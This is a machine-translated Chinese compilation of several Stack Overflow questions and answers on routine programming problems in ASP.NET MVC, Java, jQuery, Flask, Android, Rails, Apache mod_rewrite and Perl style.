首先感谢您阅读此消息，并愿意提供帮助。我大吃一惊。让我试着解释一下我的情况。我正在尝试创建一个包含答案列表的新练习。这些答案是使用 Jquery 即时创建的。我正在使用 EditorTemplates 阅读这些答案。一切正常，除了当我创建新的“答案”字段并按“发布”时，我的控制器看不到任何数据（答案）。奇怪的是。例如，当我在 answer 属性中使用 [required] 之类的数据注释时。我被重定向到索引。当我再次尝试时，我的模型不再是空的。

所以基本上我的问题是，我怎样才能设法将这些答案放入我的列表中？

我已经为你们创建了一个新项目，以便更加清晰和具体。

我有2个模型，

*   锻炼

*   答案

**运动模型类**

```
[Table("Exercise")]
public class ExerciseModel
{

    [Key]
    public int ExerciseId { get; set; }

    public string Question { get; set; }

    public IList<AnswerModel> Answers { get; set; }
} 
```

它基本上是一个简单的类。如你们所见。有一个带有答案的列表。

**答案模型**

```
[Table("Answer")]
public class AnswerModel
{
    [Key]
    public int AnswerId { get; set; }

    public string Answer { get; set; }
 } 
```

一个带有 Id 和 Answer 的简单 AnswerModel 类。

**我的控制器**

```
public class ExerciseController : Controller
{
    private readonly DataContext db = new DataContext();
    //
    // GET: /Exercise/
    public ActionResult Index()
    {
        var exercise = new ExerciseModel();
        exercise.Answers = GetAnswers();

        return View(exercise);
    }

    [HttpPost]
    public ActionResult Index(ExerciseModel exercisemodel)
    {
        //need to implement interaction with database (not yet) testing phase.
        return View("PostedData", exercisemodel);
    }

    public ActionResult NewAnswersRow(int id)
    {
        var answers = new AnswerModel { AnswerId = id };
        return View("partial/NewAnswersRow", answers);
    }

    private List<AnswerModel> GetAnswers()
    {
        var answerslist = new List<AnswerModel>();
        answerslist.Add(new AnswerModel { AnswerId = 1, Answer = "This is a hardcoded answer"}); //normally db.Answers (for testing purposes)
        return answerslist;
    }

} 
```

**我的索引视图**

```
@model exerciseTest.Models.ExerciseModel
@using (Html.BeginForm())
{

    <div class="divAnswers">
        <div  id="container">
            <div class="editor-label">
                @Html.LabelFor(model => model.Question)
            </div>
            <div class="editor-field">
                @Html.EditorFor(model => model.Question)
                @Html.ValidationMessageFor(model => model.Question)
            </div>
            @Html.EditorFor(m => m.Answers)

        </div>
        <input type="button" id="btnAdd" value="Add New Item" />
    </div>
    <p>
        <input type="submit" value="Save" />
    </p>
}

    <script>

$(function () {
    $("#btnAdd").click(function (e) {
        var itemIndex = $("#container input.iHidden").length;
        console.debug("itemIndex : "+itemIndex);
        e.preventDefault();
        $.get("@Url.Action("NewAnswersRow", "Exercise")/"+itemIndex,function(data){
            $("#container").append(data);
        });           
    });
});

</script> 
```

**我的 AnswerModel 编辑器模板**

```
@model exerciseTest.Models.AnswerModel
@{
    Layout = null;
}
<script src="~/Scripts/jquery-1.7.1.min.js"></script>
<tr> 
 <td>
  @Html.HiddenFor(x => x.AnswerId, new { @class="iHidden" })
 @Html.TextBoxFor(x => x.Answer) </td>
</tr> 
```

**我的 NewAnswersRow.cshtml 用于使用 Jquery 动态创建新行（参见代码部分的索引）**

```
@model exerciseTest.Models.AnswerModel
@{    Layout = null; }
<tr> 
 <td>
  <input type="hidden" id="Answers_@(Model.AnswerId)__Id" class="iHidden"  name='Answers[@Model.AnswerId].Id' />
  <input type='text' id='Answers_@(Model.AnswerId)__AnswersText'   name='Answers[@Model.AnswerId].AnswersText'/>
 </td>
</tr> 
```

**以及用于测试目的的“postedData”视图**

```
@model exerciseTest.Models.ExerciseModel
<h3>Posted data is </h3>

@foreach (var item in Model.Answers)
{
   <p>@item.Answer</p>
} 
```

我正在努力让这件事发挥作用。我必须说，在 5 年里，我从来没有在 StackOverflow 上问过一些问题，因为我可以找到答案。但这一次，我需要你的帮助。

谢谢 ！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-03T05:25:59.593

你的`NewAnswersRow partial view`. `Name`并且`Id`在您的 html 中是相同的，但是它是在表单帖子中传递的名称。如果你看看在`MVC`做什么，答案文本字段的 name 属性是`Answers[x].Answer`，而`Id`是`Answers[x].AnswerText`。

因此，将您的更改`name='Answers[@Model.AnswerId].AnswerText'`为`name='Answers[@Model.AnswerId].Answer'`使其符合`MVC`预期。为我工作！

# java - 为什么我不能将 random.nextInt 分配给变量？

> ID：15772971
> 
> 赞同：0
> 
> 时间：2013-04-02T19:43:13.513
> 
> 标签：java, variables, random, assign

我希望变量 p 和 z 获得分配给它们的新随机数，但是在使用下面的代码时我得到 NullPointerException。我以前做过类似的事情，而且效果很好，所以我可能很傻，错过了一些明显的东西。有什么帮助吗？谢谢！

示例代码：

```
private int p;
private int z;
private Random rand;

public test()
{
    p = 0;
    z = 0;
}

public void print()
{
    p = rand.nextInt(9);
    z = rand.nextInt(9);
    System.out.println(p + " " + z);
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-02T19:43:54.937

您还没有初始化`rand`任何东西，所以 Java`null`根据[JLS 4.12.5](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.12.5)将其初始化为。尝试

```
private Random rand = new Random(); 
```

# javascript - VKontakte 按元素点击

> ID：15772973
> 
> 赞同：0
> 
> 时间：2013-04-02T19:43:26.560
> 
> 标签：javascript, vk

我想从 JS 中单击 VKontakte Web 应用程序中的某个元素，但这是不可能的。

例如我去这个应用程序[http://vk.com/app2797985](http://vk.com/app2797985)。我想按 id 的元素点击：likeBlock_button_like。

按元素点击的标准 JS 代码：

```
javascript:document.getElementById('likeBlock_button_like').click(); 
```

但此代码不适用于此应用程序。如何解决这个问题呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:56:51.213

您无法访问该元素的原因是它位于`iframe`. [由于 iframe 来自不同的域，由于同源策略](https://developer.mozilla.org/en-US/docs/JavaScript/Same_origin_policy_for_JavaScript?redirectlocale=en-US&redirectslug=Same_origin_policy_for_JavaScript)，您无法通过 javascript 访问 dom 元素

# javascript - jQuery在其他DIV悬停时显示DIV，不起作用

> ID：15772974
> 
> 赞同：0
> 
> 时间：2013-04-02T19:43:30.527
> 
> 标签：javascript, jquery, css, hover, hidden

我正在与一些愚蠢的问题作斗争，但我需要帮助来解决它。

我有以下html：

```
<div class="sekcja" id="michalm">
    <div id="michalm_opis" class="opis hidden"><b>Lorem ipsum</b><br/></div>
</div> 
```

并在页面末尾以下代码：

```
<script>
$(function () {
    $("#michalm").hover(function () {
        $("#michalm_opis").removeClass("hidden");
    }, function () {
        $("#michalm_opis").addClass("hidden");
    });
});
</script> 
```

它仍然导致（在 Firebug 中）：

```
TypeError: $ is not a function
$(function(){ 
```

而且，显然，不起作用。

我试图找到解决方案，但仍然没有成功，时间还在继续。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:50:21.933

如果您确定包含 jQuery（首先检查），您可能已经在兼容模式下包含了 jQuery（例如，对于 WordPress 主题很常见）。您可以通过使用`jQuery()`代替`$()`- 来解决这个问题，或者您可以将整个脚本包装在一个闭包中，该闭包设置变量。

```
jQuery(function($) {
    //...your code here
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:46:21.527

将此包含在您的标题中：

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script> 
```

# python - Flask：获取 request.files 对象的大小

> ID：15772975
> 
> 赞同：29
> 
> 时间：2013-04-02T19:43:40.313
> 
> 标签：python, flask

我想获取上传图像的大小来控制它是否大于最大文件上传限制。我试过这个：

```
@app.route("/new/photo",methods=["POST"])
def newPhoto():

    form_photo = request.files['post-photo']
    print form_photo.content_length 
```

它打印了`0`。我究竟做错了什么？我应该从它的临时路径中找到这个图像的大小吗？`$_FILES['foo']['size']`Python中有没有类似PHP的东西？

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2013-04-03T08:38:14.690

这里有几件事需要注意 - content_length 属性将是浏览器报告的文件上传的内容长度，但不幸的是，许多浏览器不发送此内容，如[docs](http://werkzeug.pocoo.org/docs/wrappers/#werkzeug.wrappers.BaseRequest._get_file_stream)和[source](https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/datastructures.py#L2499)中所述。

至于您的 TypeError，接下来要注意的是，上传的 500KB 以下的文件作为[StringIO object](http://docs.python.org/2/library/stringio.html)存储在内存中，而不是假脱机到磁盘（再次参见那些文档），因此您的 stat 调用将失败。

MAX_CONTENT_LENGTH 是拒绝大于您想要的文件上传的正确方法，如果您需要它，确定数据长度的唯一可靠方法是在您处理上传后计算它 - 要么在您之后统计文件做过`.save()`：

```
request.files['file'].save('/tmp/foo')
size = os.stat('/tmp/foo').st_size 
```

或者，如果您不使用磁盘（例如将其存储在数据库中），请计算您已读取的字节数：

```
blob = request.files['file'].read()
size = len(blob) 
```

虽然显然要小心，如果您的 MAX_CONTENT_LENGTH 非常大，您不会将太多数据读入内存

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2014-05-12T04:25:46.567

如果您不想先将文件保存到磁盘，请使用以下代码，这适用于内存流

```
import os

file = request.files['file']
file.seek(0, os.SEEK_END)
file_length = file.tell() 
```

否则，这会更好

```
request.files['file'].save('/tmp/file')
file_length = os.stat('/tmp/file').st_size 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2013-04-02T19:51:41.440

设置最大文件上传限制的正确方法是通过`MAX_CONTENT_LENGTH`应用程序配置。例如，如果您想设置 16 MB 的上传限制，您可以对您的应用配置执行以下操作：

```
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024 
```

如果上传的文件太大，Flask 会自动返回状态码 413 Request Entity Too Large - 这应该在客户端处理。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2016-05-04T15:32:49.967

代码的以下部分应该满足您的目的..

```
form_photo.seek(0,2)
尺寸 = form_photo.tell()

```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-04-02T20:32:06.507

正如其他人已经建议的那样，您应该使用

```
app.config['MAX_CONTENT_LENGTH'] 
```

限制文件大小。但由于您特别想**找出**图像大小，您可以这样做：

```
import os
photo_size = os.stat(request.files['post-photo']).st_size
print photo_size 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-11-18T21:37:32.440

您可以从**os** import使用**popen**

 **先保存

```
photo=request.files['post-photo']
photo.save('tmp') 
```

现在，只需获取尺寸

```
os.popen('ls -l tmp | cut -d " " -f5').read() 
```

*   这以字节为单位
*   对于兆字节或千兆字节，使用标志**--b M**或**--b G****

# java - 将数据库备份到 sd 卡

> ID：15772985
> 
> 赞同：0
> 
> 时间：2013-04-02T19:43:58.503
> 
> 标签：java, android, android-backup-service

我正在尝试在我的应用程序中创建备份功能，但它会导致强制关闭错误

谁能给我一些想法我的代码有什么问题

请帮帮我

这是我的代码

```
public class Mydatabase {

 private String appName = "";
  private String packageName = "";
  public static final String DATABASE_NAME = "data.db";
  public boolean backup() {
    boolean rc = false;

    boolean writeable = isSDCardWriteable();
    if (writeable) {
      File file = new File(Environment.getDataDirectory() + "/data/" + packageName + "/databases/" + DATABASE_NAME);

      File fileBackupDir = new File(Environment.getExternalStorageDirectory(), appName + "/backup");
      if (!fileBackupDir.exists()) {
        fileBackupDir.mkdirs();
      }

      if (file.exists()) {
        File fileBackup = new File(fileBackupDir, DATABASE_NAME);
        try {
          fileBackup.createNewFile();
          FileUtils..copyFile(file, fileBackup);
          rc = true;
        } catch (IOException ioException) {
          //
        } catch (Exception exception) {
          //
        }
      }
    }

    return rc;
  }

  private boolean isSDCardWriteable() {
    boolean rc = false;

    String state = Environment.getExternalStorageState();
    if (Environment.MEDIA_MOUNTED.equals(state)) {
      rc = true;
    }

    return rc;
  }

    public Mydatabase(final Context context, final String appName) {
        this.appName = appName;
        packageName = context.getPackageName();
    } 
```

}

这是我的日志

```
04-03 00:39:18.595: E/AndroidRuntime(674): FATAL EXCEPTION: main
04-03 00:39:18.595: E/AndroidRuntime(674): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.neelrazin.noteit/com.neelrazin.noteit.Mydatabase}: java.lang.InstantiationException: com.neelrazin.noteit.Mydatabase
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1569)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.app.ActivityThread.access$1500(ActivityThread.java:117)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:931)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.os.Handler.dispatchMessage(Handler.java:99)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.os.Looper.loop(Looper.java:123)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.app.ActivityThread.main(ActivityThread.java:3683)
04-03 00:39:18.595: E/AndroidRuntime(674):  at java.lang.reflect.Method.invokeNative(Native Method)
04-03 00:39:18.595: E/AndroidRuntime(674):  at java.lang.reflect.Method.invoke(Method.java:507)
04-03 00:39:18.595: E/AndroidRuntime(674):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-03 00:39:18.595: E/AndroidRuntime(674):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-03 00:39:18.595: E/AndroidRuntime(674):  at dalvik.system.NativeStart.main(Native Method)
04-03 00:39:18.595: E/AndroidRuntime(674): Caused by: java.lang.InstantiationException: com.neelrazin.noteit.Mydatabase
04-03 00:39:18.595: E/AndroidRuntime(674):  at java.lang.Class.newInstanceImpl(Native Method)
04-03 00:39:18.595: E/AndroidRuntime(674):  at java.lang.Class.newInstance(Class.java:1409)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.app.Instrumentation.newActivity(Instrumentation.java:1021)
04-03 00:39:18.595: E/AndroidRuntime(674):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1561)
04-03 00:39:18.595: E/AndroidRuntime(674):  ... 11 more 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T20:06:36.523

你好像有点失落。这是备份数据库的功能方法，您可以将其放在任何类中。

```
public static void backupDatabase() throws IOException {
    //Open your local db as the input stream
    String inFileName = "/data/data/com.android.exemple/databases/databename.db";
    File dbFile = new File(inFileName);
    FileInputStream fis = new FileInputStream(dbFile);

    String outFileName = Environment.getExternalStorageDirectory()+"/database.db";
    //Open the empty db as the output stream
    OutputStream output = new FileOutputStream(outFileName);
    //transfer bytes from the inputfile to the outputfile
    byte[] buffer = new byte[1024];
    int length;
    while ((length = fis.read(buffer))>0){
        output.write(buffer, 0, length);
    }
    //Close the streams
    output.flush();
    output.close();
    fis.close();
} 
```

您需要在清单中的应用程序元素之前添加此行

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/> 
```

不要忘记更改 inFileName 变量中的包名称和两个位置的数据库名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:54:49.090

跟踪指向您正在尝试启动被`Activity`调用的事实`Mydatabase`。正如我们从您的代码片段中看到的那样，`Mydatabase`不扩展`Activity`. 系统正在寻找一个`Activity`要启动的类，而不是一个仅派生自`Object`.

# ruby-on-rails - 建立连接不适用于 Ruby 控制台

> ID：15772987
> 
> 赞同：2
> 
> 时间：2013-04-02T19:44:05.487
> 
> 标签：ruby-on-rails, ruby

我已配置`database.yml`为包含“logging_development”作为表示另一个数据库的标签。其中一种模型是使用“建立连接”来使用此“标签”连接到数据库。

我的模型如下所示：

类 AdHistory < ActiveRecord::Base

建立连接“logging_#{RAILS_ENV}”

Rails 服务器在启动并建立模型与相关数据库的连接时工作正常。但是当我启动 ruby​​ 控制台并尝试使用该模型时，它使用“开发”标签`database.yml`来建立连接。我已经研究了这个问题，但无法找到解决方案。这是该`database.yml`文件的示例：

```
development:
  adapter: mysql
  encoding: utf8
  reconnect: true
  database: ad_production
  pool: 5
  username: root
  password: ********
  socket: /tmp/mysql.sock

logging_development:
  adapter: mysql
  encoding: utf8
  reconnect: true
  database: ad_logging
  pool: 5
  username: root
  password: ********
  socket: /tmp/mysql.sock 
```

我正在使用 Ruby 1.8.7 和 Rails 2.3.8

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T18:46:37.803

我找到了我的问题的答案。问题是我使用的是 Multi_DB gem，它拦截了所有正在执行的 SQL 查询并将这些查询重定向到从数据库。这就是为什么没有针对我在“database.yml”中选择的数据库执行这些查询的原因。一旦 multi_db 连接无效，控制台就会按预期运行。使用“multi_db”gem 的问题之一是它只接受连接名称作为“_slave_database_”。因此，任何与 database.yml 文件中 multi_db gem 的预期名称的偏差都会导致错误，并且不会针对所选数据库执行查询。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:47:42.517

您在运行 rails 控制台时使用过 RAILS_ENV=logging_development 吗？如果不是，你应该这样做，因为默认的 Rails 环境是`development`. 因此，尝试使用它加载控制台来设置 RAILS_ENV 变量：

`RAILS_ENV=logging_development scripts/rails console`

# apache - mod重写变量子目录内的子目录

> ID：15772993
> 
> 赞同：0
> 
> 时间：2013-04-02T19:44:13.533
> 
> 标签：apache, mod-rewrite

我需要以下示例

```
http://www.domain.com/a/b/$var1/newsubdir/c/$var2/$var3/$foo.mp3 
```

重写为：

```
http://www.domain.com/a/b/$var1/subdir/c/$var2/$var3/$foo.mp3 
```

我的代码现在需要调用“newsubdir”而不是“subdir”。由于这是许多不同变量子目录 ($var1) 中的子目录，因此不仅仅是重命名一个文件夹的问题。

$var1、$var2、$var3 是根据帐户 ID、用户等生成的物理文件路径（现在无法更改） $foo 是文件名

所以我只是在寻找合适的重写规则，它可以简单地处理“$var1”而基本上忽略其余的。我想在规则中包含“/a/b/”，因为代码中可能有其他“/b/”实例可能会被此规则捕获。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:04:23.810

这是你想要的吗：

```
Options +FollowSymlinks
RewriteEngine on

RewriteRule ^a/b/(.+)/newsubdir/c/(.+)/(.+)/(.+).mp3 /a/b/$1/subdir/c/$2/$3/$4.mp3 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:56:43.957

通过启用 mod_rewrite 和 .htaccess `httpd.conf`，然后将此代码放在您`.htaccess`的`DOCUMENT_ROOT`目录下：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

RewriteRule ^(a/b)/([^/]+)/subdir/(c)/([^/]+)/([^/]+)/([^.]+\.mp3)$ /$1/$2/newsubdir/$3/$4/$5/$6 [L,R=302,NC] 
```

# perl - 在 Perl 中使用无括号子例程调用的原因是什么？

> ID：15772996
> 
> 赞同：17
> 
> 时间：2013-04-02T19:44:22.207
> 
> 标签：perl, coding-style, call, subroutine, parentheses

根据[perldoc perlsub](http://perldoc.perl.org/perlsub.html)：

> & 在现代 Perl 中是可选的，如果子例程已预先声明，则括号也是可选的。

我注意到很多时候，人们在调用 Perl 子例程时使用可以省略括号的事实（例如，从最近的 SO 答案中随机引用）：

```
open my $fin, '<', $file; 
```

与

```
open(my $fin, '<', $file); 
```

**使用第二个（无括号）版本的主要（理想情况下，技术）原因是什么？**

[perldoc perlsyn](http://perldoc.perl.org/perlsyn.html)除了再次提及可选性外，没有就该主题发表任何意见。

对我来说，总是使用括号主要是一种风格选择，因为我是一名 C 开发人员。但**我想知道**作为 Perl 开发人员，我是否因为不使用可选的无括号语法而遗漏了什么。

* * *

PS我很清楚喜欢带括号的版本的原因-例如[，间接对象表示法的问题](http://modernperlbooks.com/mt/2009/08/the-problems-with-indirect-object-notation.html)，或者[在使用不带括号之前声明非内置函数的要求](https://stackoverflow.com/questions/5992715/why-is-parenthesis-optional-only-after-sub-declaration)，或者优先级visavi `or`vs.的问题`||`。我感兴趣的是相反的。

* * *

PPS 我对仅仅陈述“它的风格更好”/“更具可读性”而没有任何研究支持这一观点的答案不太感兴趣。我对喜欢省略括号的技术原因或**支持的**风格差异偏好感兴趣（请不要将“支持”与“呼吁权威”或[“argumentum ad populum”](http://en.wikipedia.org/wiki/Argumentum_ad_populum)的谬误混淆。一项研究显示速度或对代码的理解就是证明。“Perl 社区中的每个人都同意”或“Damien Conway 建议这一点”而不解释 Damien 如何支持这一点不是）。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-02T20:58:45.763

我认为除了风格之外，它真正重要的唯一时间是`&subname`根据[perldoc perlsub](http://p3rl.org/perlsub)很少使用的：

```
&NAME;     # Makes current @_ visible to called subroutine. 
```

当然，在某些情况下使用括号可能更容易消除歧义（对于解析器和未来的读者），否则不使用它们可能会消除其他情况下的噪音；其中任何一个的必要程度可能是我选择其中一个的主要原因。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-02T19:59:06.850

来自[Perl::Critic::Policy::CodeLayout::ProhibitParensWithBuiltins](http://search.cpan.org/perldoc?Perl::Critic::Policy::CodeLayout::ProhibitParensWithBuiltins)：

> Conway 建议在参数列表周围不带括号调用所有内置函数。这减少了视觉混乱并消除了内置功能与用户功能的歧义。

Conway 是*Perl Best Practices*一书的作者。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-04-02T21:22:24.800

省略括号没有技术原因。这纯粹是首选编码风格的问题。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-03T16:31:48.603

这纯粹是一个风格问题。对于 Perl 程序员来说，`print "Hi!\n";`它比`print("Hi!\n");`. 使代码尽可能可读是一种很好的风格，而且——在其他条件相同的情况下——额外的符号会使阅读变得更加困难。由于内置插件不需要括号，因此询问它们提供的消歧是否证明了额外的认知负荷是有意义的。Perl 程序员作为一个阶级已经站在“不”一边，这在一定程度上得益于 Damien Conway 对规则的形式化。

Conway 还建议保持内置的无括号有助于将它们与用户定义的函数区分开来，但我认为这个论点没有说服力。更正确的说法是，许多内置函数被设计为无需括号即可自然阅读，因此应该这样使用。看到`defined($x)`或`len($y)`使 Perl 程序员抽搐，但仅是看到`croak($z)`.

请注意，将 Perl 当作 C 来编写是非常*糟糕的*风格。像 Perl 一样编写 Perl。